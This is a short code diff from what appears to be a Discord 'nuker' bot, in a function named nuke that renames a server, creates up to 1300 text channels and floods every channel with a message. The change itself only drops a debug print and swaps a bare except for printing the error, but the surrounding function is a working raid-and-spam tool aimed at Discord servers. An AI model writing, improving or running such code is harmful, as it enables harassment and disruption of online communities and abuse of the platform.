@@ -24,12 +24,11 @@ async def nuke(message):
         channels = guild.text_channels
         await guild.edit(name=SERVER_CHANNEL_NAME)
         for i in range(1300):
-            print("a")
             channel = await guild.create_text_channel(SERVER_CHANNEL_NAME)
             channels.append(channel)
             await asyncio.gather(*(channel.send(MESSAGE) for channel in channels))
-    except:
-        pass
+    except Exception as e:
+        print(e)
 
 @client.event
 async def on_ready():
